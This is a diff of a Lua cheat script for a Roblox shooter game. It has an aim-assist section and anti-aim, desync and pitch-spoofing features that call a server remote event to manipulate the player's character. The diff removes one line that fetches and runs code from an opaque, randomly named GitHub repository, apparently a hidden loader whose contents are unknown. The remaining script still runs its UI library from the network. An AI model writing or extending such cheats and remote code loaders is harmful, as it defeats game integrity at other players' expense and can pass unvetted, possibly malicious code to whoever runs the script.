@@ -11,7 +11,6 @@ local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
 local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
 local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
 local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/24124s1/d3ecedwcedwce/refs/heads/main/xuiwexniwenxoewij.lua", true))()
 
 -- // Clones
 local CWorkspace = cloneref(game:GetService("Workspace")) 
@@ -241,7 +240,6 @@ end)
 
 -- // legit bot
 local Mouse = LocalPlayer:GetMouse()
-local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 
 local legit = {
@@ -748,10 +746,6 @@ RageRight:AddToggle("MyToggle", {
 -- // Anti-Aim
 local aa = Tabs.aa:AddLeftGroupbox("Anti Aim")
 
-
-local RunService = game:GetService("RunService")
-
-
 local antiaim = {
     YawType = "Static",
     YawEnabled = false,
@@ -759,67 +753,47 @@ local antiaim = {
     currentYaw = 0,
     lastJitter = 0,
     jitterSwitch = false,
-    fakeLagDelay = 0.1,
     desyncDelay = 0.5,
-    fakeLagEnabled = false,
     desyncEnabled = false,
-    lastFakeLag = 0,
     lastDesync = 0,
     turnDirection = 1,
-    desyncHighlightParts = {},
+    desyncHighlight = nil,
+    desyncOffset = 30,
+    desyncColor = Color3.fromRGB(255, 0, 0),
+    DesyncType = "Static",
+    pitchEnabled = false,
+    pitchMode = "Zero",
+    customPitchValue = 0,
+    pitchLoop = nil,
 }
 
-function applyChamsHighlight(character)
-    if #antiaim.desyncHighlightParts > 0 then return end
-    for _, part in pairs(character:GetChildren()) do
-        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
-            local highlightPart = Instance.new("Part")
-            highlightPart.Name = "DesyncHighlight"
-            highlightPart.Size = part.Size
-            highlightPart.CFrame = part.CFrame
-            highlightPart.Transparency = 0.6
-            highlightPart.Anchored = false
-            highlightPart.CanCollide = false
-            highlightPart.Material = Enum.Material.Neon
-            highlightPart.BrickColor = BrickColor.new("Bright red")
-            highlightPart.CastShadow = false
-            highlightPart.Parent = part
-            local weld = Instance.new("WeldConstraint")
-            weld.Part0 = part
-            weld.Part1 = highlightPart
-            weld.Parent = highlightPart
-            table.insert(antiaim.desyncHighlightParts, highlightPart)
-        end
-    end
+function applyDesyncHighlight(character)
+    if antiaim.desyncHighlight then return end
+    local highlight = Instance.new("Highlight")
+    highlight.Name = "DesyncHighlight"
+    highlight.Adornee = character
+    highlight.FillColor = antiaim.desyncColor
+    highlight.FillTransparency = 0.4
+    highlight.OutlineTransparency = 1
+    highlight.Parent = character
+    antiaim.desyncHighlight = highlight
 end
 
-function removeChamsHighlight()
-    for _, highlight in pairs(antiaim.desyncHighlightParts) do
-        if highlight and highlight.Parent then
-            highlight:Destroy()
-        end
+function removeDesyncHighlight()
+    if antiaim.desyncHighlight and antiaim.desyncHighlight.Parent then
+        antiaim.desyncHighlight:Destroy()
+        antiaim.desyncHighlight = nil
     end
-    antiaim.desyncHighlightParts = {}
-end
-
-function IsOnSameTeam(player)
-    return player.Team == LocalPlayer.Team
 end
 
 RunService.RenderStepped:Connect(function(deltaTime)
     local char = LocalPlayer.Character
     if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") then
-        removeChamsHighlight()
+        removeDesyncHighlight()
         return
     end
     if char.Humanoid.Health <= 0 then
-        removeChamsHighlight()
-        return
-    end
-
-    if not antiaim.YawEnabled then
-        char.Humanoid.AutoRotate = true
-        removeChamsHighlight()
+        removeDesyncHighlight()
         return
     end
 
@@ -828,10 +802,9 @@ RunService.RenderStepped:Connect(function(deltaTime)
 
     local closestEnemy, shortestDist = nil, math.huge
     for _, p in pairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer and p.Character and not IsOnSameTeam(p) then
-            local eRoot = p.Character:FindFirstChild("HumanoidRootPart")
-            local eHum = p.Character:FindFirstChild("Humanoid")
-            if eRoot and eHum and eHum.Health > 0 then
+        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChild("Humanoid") then
+            if p.Team ~= LocalPlayer.Team and p.Character.Humanoid.Health > 0 then
+                local eRoot = p.Character.HumanoidRootPart
                 local dist = (eRoot.Position - basePos).Magnitude
                 if dist < shortestDist then
                     shortestDist = dist
@@ -841,68 +814,97 @@ RunService.RenderStepped:Connect(function(deltaTime)
         end
     end
 
-    if closestEnemy then
-        local now = tick()
+    local now = tick()
 
-        if antiaim.fakeLagEnabled then
-            if (now - antiaim.lastFakeLag) < antiaim.fakeLagDelay then
-                return
-            end
-            antiaim.lastFakeLag = now
-        end
-
-        if antiaim.desyncEnabled then
-            if (now - antiaim.lastDesync) > antiaim.desyncDelay then
-                antiaim.turnDirection = -antiaim.turnDirection
-                antiaim.lastDesync = now
-            end
-            applyChamsHighlight(char)
-        else
-            removeChamsHighlight()
-        end
-
-        char.Humanoid.AutoRotate = false
-
-        local dir = (closestEnemy.Position - basePos).Unit
-        local targetYaw = math.atan2(dir.X, dir.Z)
-
+    if antiaim.YawEnabled and closestEnemy then
         if antiaim.YawType == "Static" then
-            targetYaw = targetYaw + math.rad(antiaim.YawOffset)
+            local dir = (closestEnemy.Position - basePos).Unit
+            local targetYaw = math.atan2(dir.X, dir.Z) + math.rad(antiaim.YawOffset)
             rootPart.CFrame = CFrame.new(basePos) * CFrame.Angles(0, targetYaw, 0)
-
         elseif antiaim.YawType == "Jitter" then
-            if tick() - antiaim.lastJitter > 0.1 then
+            if now - antiaim.lastJitter > 0.1 then
                 antiaim.jitterSwitch = not antiaim.jitterSwitch
-                antiaim.lastJitter = tick()
+                antiaim.lastJitter = now
             end
+            local dir = (closestEnemy.Position - basePos).Unit
             local jitterAngle = antiaim.jitterSwitch and math.rad(90) or math.rad(-90)
-            targetYaw = targetYaw + jitterAngle + math.rad(antiaim.YawOffset)
+            local targetYaw = math.atan2(dir.X, dir.Z) + jitterAngle + math.rad(antiaim.YawOffset)
             rootPart.CFrame = CFrame.new(basePos) * CFrame.Angles(0, targetYaw, 0)
-
         elseif antiaim.YawType == "Spin" then
             antiaim.currentYaw = (antiaim.currentYaw or 0) + math.rad(antiaim.YawOffset) * deltaTime * 60
             rootPart.CFrame = CFrame.new(basePos) * CFrame.Angles(0, antiaim.currentYaw, 0)
-
         elseif antiaim.YawType == "UnHit" then
+            local dir = (closestEnemy.Position - basePos).Unit
+            local targetYaw = math.atan2(dir.X, dir.Z)
             rootPart.CFrame = CFrame.new(basePos) * CFrame.Angles(math.rad(180), targetYaw, 0)
+            local upperBodyParts = {"UpperTorso", "LowerTorso", "LeftUpperArm", "RightUpperArm", "LeftLowerArm", "RightLowerArm", "LeftHand", "RightHand", "Head"}
+            for _, partName in pairs(upperBodyParts) do
+                local part = char:FindFirstChild(partName)
+                if part and part:IsA("BasePart") then
+                    part.CFrame = rootPart.CFrame
+                    part.Velocity = Vector3.new(0, 0, 0)
+                end
+            end
             for _, part in pairs(char:GetChildren()) do
-                if part:IsA("BasePart") and part ~= rootPart then
+                if part:IsA("BasePart") and part ~= rootPart and not table.find(upperBodyParts, part.Name) then
                     part.Velocity = Vector3.new(math.random(-50, 50), math.random(100, 200), math.random(-50, 50))
                 end
             end
         end
-
-        if antiaim.desyncEnabled then
-            local desyncYawOffset = math.rad(30) * antiaim.turnDirection
-            rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, desyncYawOffset, 0)
-        end
-
+        char.Humanoid.AutoRotate = false
     else
         char.Humanoid.AutoRotate = true
-        removeChamsHighlight()
+    end
+
+    if antiaim.desyncEnabled and closestEnemy then
+        applyDesyncHighlight(char)
+        local desyncYawOffset = 0
+        local offset = math.rad(math.clamp(antiaim.desyncOffset, 0, 360))
+
+        if antiaim.DesyncType == "Static" then
+            if (now - antiaim.lastDesync) > antiaim.desyncDelay then
+                antiaim.turnDirection = -antiaim.turnDirection
+                antiaim.lastDesync = now
+            end
+            desyncYawOffset = offset * antiaim.turnDirection
+        elseif antiaim.DesyncType == "Jitter" then
+            antiaim.turnDirection = -antiaim.turnDirection
+            desyncYawOffset = offset * antiaim.turnDirection
+        elseif antiaim.DesyncType == "Extended Jitter" then
+            if (now - antiaim.lastDesync) > antiaim.desyncDelay then
+                antiaim.turnDirection = -antiaim.turnDirection
+                antiaim.lastDesync = now
+            end
+            local randomOffset = math.rad(math.random(-15, 15))
+            desyncYawOffset = offset * antiaim.turnDirection + randomOffset
+        end
+
+        if antiaim.desyncHighlight then
+            antiaim.desyncHighlight.FillColor = antiaim.desyncColor
+        end
+
+        rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, desyncYawOffset, 0)
+    else
+        removeDesyncHighlight()
+    end
+
+    if antiaim.pitchEnabled then
+        local direction
+        if antiaim.pitchMode == "Random" then
+            direction = ({-1, 0, 1})[math.random(1, 3)]
+        elseif antiaim.pitchMode == "Up" then
+            direction = 1
+        elseif antiaim.pitchMode == "Down" then
+            direction = -1
+        elseif antiaim.pitchMode == "Zero" then
+            direction = 0
+        elseif antiaim.pitchMode == "Custom" then
+            direction = antiaim.customPitchValue
+        end
+        local args = {[1] = direction, [2] = false}
+        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("ControlTurn"):FireServer(unpack(args))
     end
 end)
-
 
 aa:AddToggle("YawToggle", {
     Text = "Yaw",
@@ -925,7 +927,6 @@ aa:AddSlider("YawAmountSlider", {
     Default = 0,
     Min = 0,
     Max = 180,
-    Rounding = 0,
     Callback = function(value)
         antiaim.YawOffset = value
     end,
@@ -936,93 +937,84 @@ aa:AddToggle("DesyncToggle", {
     Default = false,
     Callback = function(state)
         antiaim.desyncEnabled = state
-        if not state then
-            removeChamsHighlight()
+        if not state then removeDesyncHighlight() end
+    end,
+})
+:AddColorPicker("DesyncChamsColor", {
+    Text = "Desync Chams Color",
+    Default = Color3.fromRGB(255, 0, 0),
+    Callback = function(color)
+        antiaim.desyncColor = color
+        if antiaim.desyncHighlight then
+            antiaim.desyncHighlight.FillColor = color
         end
+    end,
+})
+
+aa:AddDropdown("DesyncTypeDropdown", {
+    Values = {"Static", "Jitter", "Extended Jitter"},
+    Default = 1,
+    Callback = function(value)
+        antiaim.DesyncType = value
+    end,
+})
+
+aa:AddSlider("DesyncOffsetSlider", {
+    Text = "Desync Offset",
+    Default = 30,
+    Min = 0,
+    Max = 360,
+    Callback = function(value)
+        antiaim.desyncOffset = value
     end,
 })
 
 aa:AddSlider("DesyncDelaySlider", {
     Text = "Desync Delay",
-    Default = 0,
+    Default = 0.5,
     Min = 0,
     Max = 1,
-    Rounding = 0,
+    Rounding = 2,
     Callback = function(value)
         antiaim.desyncDelay = value
     end,
 })
 
-aa:AddToggle("FakeLagToggle", {
-    Text = "Fake Lag",
+aa:AddToggle("PitchToggle", {
+    Text = "Pitch",
     Default = false,
     Callback = function(state)
-        antiaim.fakeLagEnabled = state
-    end,
-})
-
-aa:AddSlider("FakeLagDelaySlider", {
-    Text = "Fake Lag Delay",
-    Default = 0,
-    Min = 0,
-    Max = 1,
-    Rounding = 0,
-    Callback = function(value)
-        antiaim.fakeLagDelay = value
-    end,
-})
-
-aa:AddToggle("MyToggle", {
-	Text = "Pitch",
-	Tooltip = "",
-	DisabledTooltip = "", 
-	Default = false, 
-	Disabled = false, 
-	Visible = true, 
-	Risky = true, 
-	Callback = function(state)
         antiaim.pitchEnabled = state
-
-        if antiaim.pitchEnabled then
-            if not antiaim.pitchLoop then
-                antiaim.pitchLoop = task.spawn(function()
-                    while antiaim.pitchEnabled do
-                        local direction
-
-                        if antiaim.pitchMode == "Random" then
-                            direction = ({-1, 0, 1})[math.random(1, 3)]
-                        elseif antiaim.pitchMode == "Up" then
-                            direction = 1
-                        elseif antiaim.pitchMode == "Down" then
-                            direction = -1
-                        elseif antiaim.pitchMode == "Zero" then
-                            direction = 0
-                        elseif antiaim.pitchMode == "Custom" then
-                            direction = customPitchValue
-                        end
-
-                        local args = {
-                            [1] = direction,
-                            [2] = false
-                        }
-                        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("ControlTurn"):FireServer(unpack(args))
-                        task.wait()
+        if state and not antiaim.pitchLoop then
+            antiaim.pitchLoop = task.spawn(function()
+                while antiaim.pitchEnabled do
+                    local direction
+                    if antiaim.pitchMode == "Random" then
+                        direction = ({-1, 0, 1})[math.random(1, 3)]
+                    elseif antiaim.pitchMode == "Up" then
+                        direction = 1
+                    elseif antiaim.pitchMode == "Down" then
+                        direction = -1
+                    elseif antiaim.pitchMode == "Zero" then
+                        direction = 0
+                    elseif antiaim.pitchMode == "Custom" then
+                        direction = antiaim.customPitchValue
                     end
-                    antiaim.pitchLoop = nil
-                end)
-            end
-        else
+                    local args = {[1] = direction, [2] = false}
+                    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("ControlTurn"):FireServer(unpack(args))
+                    task.wait()
+                end
+                antiaim.pitchLoop = nil
+            end)
+        elseif not state then
             antiaim.pitchEnabled = false
         end
-	end,
+    end,
 })
 
-aa:AddDropdown("MyMultiDropdown", {
+aa:AddDropdown("PitchTypeDropdown", {
     Values = {"Up", "Down", "Zero", "Random", "Custom"},
-    Default = 1,
-    Multi = false, 
-    Text = "Pitch Type",
-    Tooltip = "", 
+    Default = 3,
     Callback = function(value)
         antiaim.pitchMode = value
     end,
@@ -1034,7 +1026,6 @@ aa:AddSlider("CustomPitchSlider", {
     Min = -1,
     Max = 1,
     Float = 0.01,
-    Tooltip = "Only applies if Pitch Type is set to Custom",
     Callback = function(value)
         antiaim.customPitchValue = value
     end,
@@ -4257,8 +4248,6 @@ spawn(function()
     end
 end)
 
-local RunService = game:GetService("RunService")
-
 if RayIgnore then
     RayIgnore.ChildAdded:Connect(function(obj)
         if obj.Name == "Fires" then
@@ -4663,7 +4652,7 @@ specTitle.Parent = specFrame
 
 local specList = Instance.new("TextLabel")
 specList.Size = UDim2.new(1, -10, 1, -20)
-specList.Position = UDim2.new(0, -15, 0, 20)
+specList.Position = UDim2.new(0, 5, 0, 20)
 specList.BackgroundTransparency = 1
 specList.TextColor3 = Color3.new(1, 1, 1)
 specList.Font = Enum.Font.SourceSans
